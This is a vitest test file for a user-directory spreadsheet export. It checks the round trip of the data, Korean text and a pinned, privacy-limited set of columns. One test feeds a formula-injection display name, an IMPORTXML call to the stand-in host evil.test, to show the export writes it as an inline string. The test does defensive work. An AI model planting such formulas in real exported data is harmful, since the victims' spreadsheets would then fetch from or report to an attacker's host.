import { describe, expect, it } from "vitest";
import { unzipSync, strFromU8 } from "fflate";
import {
  buildUserExportSheet,
  toUserExportRows,
  userExportCopy,
} from "@cove/shared";

import { writeWorkbook } from "../common/workbook-writer.js";
import { readWorkbook } from "../manage/workbook-reader.js";

function sheetFor(displayName: string) {
  return buildUserExportSheet(
    toUserExportRows({
      displayName,
      username: "minji",
      email: "minji@example.com",
      status: "ACTIVE",
      platformRole: "USER",
      createdAt: "2026-08-29T01:00:00.000Z",
      memberships: [
        {
          academyName: "Mapo Dlab",
          academySlug: "dlab-mapo",
          role: "STUDENT",
          status: "ACTIVE",
          joinedAt: "2026-03-04T00:00:00.000Z",
        },
      ],
    }),
    "en",
    "Asia/Seoul",
  );
}

function write(displayName: string): Buffer {
  return writeWorkbook({
    sheets: [{ name: userExportCopy.en.sheet, rows: sheetFor(displayName) }],
  });
}

/**
 * The export, as a file that actually opens.
 *
 * The reader here is the member importer's — a different implementation from
 * the writer, which is what makes this a round trip rather than a restatement.
 */
describe("user export workbook", () => {
  it("reads back the header and the row it was given", () => {
    const grid = readWorkbook({
      bytes: write("Kim Minji"),
      filename: "cove-users.xlsx",
    });

    // `rows` includes the header, which the member importer's reader keeps
    // rather than consuming — its callers match columns by name.
    expect(grid.rows[0]).toEqual(userExportCopy.en.headers);
    expect(grid.rows[1]).toEqual([
      "Kim Minji",
      "minji@example.com",
      "minji",
      "Active",
      "",
      "2026-08-29",
      "Mapo Dlab",
      "dlab-mapo",
      "Student",
      "Active",
      "2026-03-04",
    ]);
  });

  it("carries Korean names through the zip unharmed", () => {
    const grid = readWorkbook({
      bytes: write("김민지"),
      filename: "cove-users.xlsx",
    });
    expect(grid.rows[1]![0]).toBe("김민지");
  });

  /**
   * Formula injection, and why this feature writes `.xlsx` rather than CSV.
   *
   * A display name of `=IMPORTXML(...)` in a CSV *is* a formula — the format
   * has no cell type, so Excel evaluates it on open and the usual mitigation
   * is prefixing an apostrophe that corrupts the value for every legitimate
   * reader. Here the cell is declared `inlineStr` and Excel never parses it.
   *
   * The assertion is on the XML rather than on the read-back value on purpose:
   * a reader would return the text either way, so only the part file can show
   * that no formula element was written.
   */
  it("writes an attacker's display name as an inline string, never a formula", () => {
    const bytes = write('=IMPORTXML("http://evil.test","//a")');
    const sheet = strFromU8(
      unzipSync(new Uint8Array(bytes))["xl/worksheets/sheet1.xml"]!,
    );

    expect(sheet).not.toContain("<f>");
    expect(sheet).toContain('t="inlineStr"');
    expect(sheet).toContain("IMPORTXML");
  });

  /**
   * The column set is the whole privacy surface of this feature, so it is
   * pinned rather than described. A column added here without a decision is a
   * test failure, which is the point: the participation permission must not be
   * bypassable by a filename.
   */
  it("holds the directory's columns and no others", () => {
    expect(userExportCopy.en.headers).toEqual([
      "Name",
      "Email",
      "Username",
      "Account",
      "Platform access",
      "Signed up",
      "Academy",
      "Academy address",
      "Role",
      "Membership",
      "Member since",
    ]);

    const forbidden = [
      "guardian",
      "birth",
      "school",
      "phone",
      "solved",
      "points",
      "class",
      "course",
      "student number",
      "employee",
    ];
    for (const locale of ["en", "ko"] as const) {
      for (const header of userExportCopy[locale].headers) {
        for (const word of forbidden) {
          expect(header.toLowerCase(), `${locale}/${header}`).not.toContain(
            word,
          );
        }
      }
    }
  });
});
